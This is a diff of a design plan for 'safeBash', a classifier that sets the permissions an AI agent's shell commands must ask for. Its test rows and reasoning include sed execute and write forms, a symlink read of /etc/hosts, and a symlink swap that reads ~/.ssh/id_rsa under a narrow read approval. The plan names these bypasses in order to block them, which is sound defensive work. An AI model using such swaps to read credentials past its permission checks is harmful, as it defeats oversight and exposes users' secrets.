+- [ ] Test rows: `sed -n 10,20p one.txt` and `sed -n '5p' one.txt` ask `std::read`. `sed -n '1,5p;7p' one.txt`, `sed -i s/a/b/ one.txt`, `sed -n '1e true' one.txt`, and `sed -n 'w out.txt' one.txt` are broad with the reason "no rule for `sed`". `git log | sed -n 1,5p` is broad, as today. `stat one.txt` asks `std::ls`. `shasum one.txt` and `file one.txt` ask `std::read`.
+- [ ] Check the saved rule: the owner's policy has `{ command: "sed", subcommand: "-n" }` under `std::exec`. After this task that rule matches nothing safeBash raises: a range read asks `std::read`, and every other `sed` asks `std::bash`. The PR description must tell the owner two things. The saved rule has been approving the `e` and `w` forms above. And a `sed` line that is not a plain range read, such as `sed -n '/pattern/p' file`, will now ask `std::bash` where the saved rule used to approve it.
 - [ ] Implement.
 
 ## PR 5: missing paths and files the line writes
@@ -724,7 +764,7 @@ type LineState = {
 `written` holds the `std::write` payloads the line has raised so far. `WritePayload` already has the `dir` and `filename` that a later read is compared with, so no new type is needed.
 
 - `Classified.cwd` becomes `Classified.state: LineState`. Every `classify*` function takes a `LineState` where it took `cwd`.
-- `def afterCommand(state: LineState, effects: Effect[]): LineState`. It adds the payload of every `std::write` effect to `written`. It sets `opaque` unless every effect is a read effect or a `std::write`. The read effects are the existing `READ_EFFECTS` list, plus the `std::git::*` and `std::github::*` reads. The rule is written this way round on purpose: an effect added to safeBash later sets `opaque` until someone decides it is safe, where a list of dangerous effects would let it through.
+- `def afterCommand(state: LineState, effects: Effect[]): LineState`. It adds the payload of every `std::write` effect to `written`. It sets `opaque` unless every effect is a read effect or a `std::write`. The read effects are the existing `READ_EFFECTS` list, plus a second list that names each git and GitHub read one by one: `std::git::status`, `log`, `diff`, `show`, `blame`, `branchList`, `remoteList`, `stashList`, and the eleven `std::github` reads in the `GithubRead` set. The list is by name and never by prefix. `git checkout` and `git stash pop` are `std::git::*` effects too, and either can put a symlink that a commit holds into the working folder. The rule is written this way round on purpose: an effect added to safeBash later sets `opaque` until someone decides it is safe, where a list of dangerous effects would let it through.
 - A pipeline's stages run at the same time. So the state a stage is classified in is the state before the pipeline, and the state after the pipeline is `afterCommand` applied over all its stages.
 - Parentheses reset `cwd`, as today. They do not reset `written` or `opaque`, because a file a subshell writes is still there afterwards.
 
@@ -733,7 +773,7 @@ type LineState = {
 ### Task 5.2: a missing path resolves by its parent
 
 **Interfaces:**
-- Produces: `def missingTarget(text: string, word: Word, cwd: string): Result<WritePayload>` in `stdlib/safeBash.agency`. It calls `_resolveRedirectTarget`, the resolver `>` already uses for a file that does not exist yet, which returns the real parent folder and the name. It adds one check: the path must be missing. Using the redirect's own resolver means a read and a write of the same new file get the same `dir` and `filename`, which Task 5.3 depends on.
+- Produces: `def missingTarget(text: string, word: Word, cwd: string): Result<WritePayload>` in `stdlib/safeBash.agency`. It calls `_resolveRedirectTarget`, the resolver `>` already uses for a file that does not exist yet, which returns the real parent folder and the name. It adds two checks. The path must be missing. And the parent must be a folder that exists: `_resolveRedirectTarget` accepts a missing parent, because its walker keeps every step after the first missing one as written, so without this check `cat nodir/nope.txt` would resolve. Using the redirect's own resolver means a read and a write of the same new file get the same `dir` and `filename`, which Task 5.3 depends on.
 - `resolveReadPath` and `resolveTargets` gain a `state: LineState` parameter. When `resolveTarget` fails because the path is missing:
   - If `state.opaque` is true, fail as today.
   - Otherwise call `missingTarget`. A read verb gets a `disk` source for that file. A listing verb whose row says a file asks for its folder gets that folder, with `recursive: false`.
@@ -750,7 +790,7 @@ type LineState = {
 | `find nope -name x` | broad | `std::bash` |
 | `pnpm build && cat out.txt` with `out.txt` missing | broad | `std::bash` |
 
-- [ ] Test node `missingPathAfterAProgramIsBroad` (Review Focus 2): `ln -s /etc/hosts x; cat x`, `mkdir x; ls x`, and `cp one.txt y; cat y` are all broad.
+- [ ] Test node `missingPathAfterAProgramIsBroad` (Review Focus 2): `ln -s /etc/hosts x; cat x`, `mkdir x; ls x`, `cp one.txt y; cat y`, and `ln -sf /etc/hosts out.txt > out.txt; cat out.txt` are all broad.
 - [ ] A lone `cat nope.txt` used to go to bash. Check that `tryShellFreeRead` still refuses it, so it runs real `cat` and the model reads cat's own error.
 - [ ] Implement.
 
@@ -759,7 +799,17 @@ type LineState = {
 **Interfaces:**
 - In `resolveReadPath`, before the `opaque` check: when the path is missing and `missingTarget` returns a `dir` and `filename` that match an entry of `state.written`, resolve to it even when `state.opaque` is true.
 
-The reason this is safe when the line is opaque: the redirect creates the file as its command starts, and the line asked `std::write` for that exact path. This is the one case where safeBash knows a missing file will exist.
+safeBash knows the file will exist, because the redirect creates it as its command starts. It does not know the file will still be the one the redirect created. This line shows why:
+
+```
+ln -sf ~/.ssh/id_rsa out.txt > out.txt; cat out.txt
+```
+
+The redirect creates `out.txt`, then `ln -sf` replaces it with a link to the key, and `cat` reads the key under a `std::read` that names `out.txt`.
+
+The rule is still safe, for this reason. The program between the write and the read was approved by a person or a policy. A general program, such as `pnpm test` or `node x.js`, can already read any file itself and print it, so swapping a file adds nothing to what its approval gave. A swap adds something only for a program that does one narrow thing, where a person would approve it without thinking of file reads. `ln` is that program, and after Task 4.2 it asks `std::bash`, so the line above is broad. `cp` and `mv` ask `std::bash` for the same reason. A new narrow program that can replace a file must be added to `NO_EXEC_PROGRAMS` before it gets any rule. Put that sentence in the comment above the list.
+
+The same swap is possible today for a path that exists when the plan is made, as in `ln -sf ~/.ssh/id_rsa one.txt; cat one.txt`. Task 4.2 closes that one as well.
 
 - [ ] Test node `readsOfFilesTheLineWrote`: with a handler that approves everything, each of these is narrow, and the effect list is as given.
   - `gh pr diff 1 --repo o/r > /tmp/x.diff 2>&1; wc -l /tmp/x.diff` asks `std::github::prDiff`, `std::write`, `std::read`.
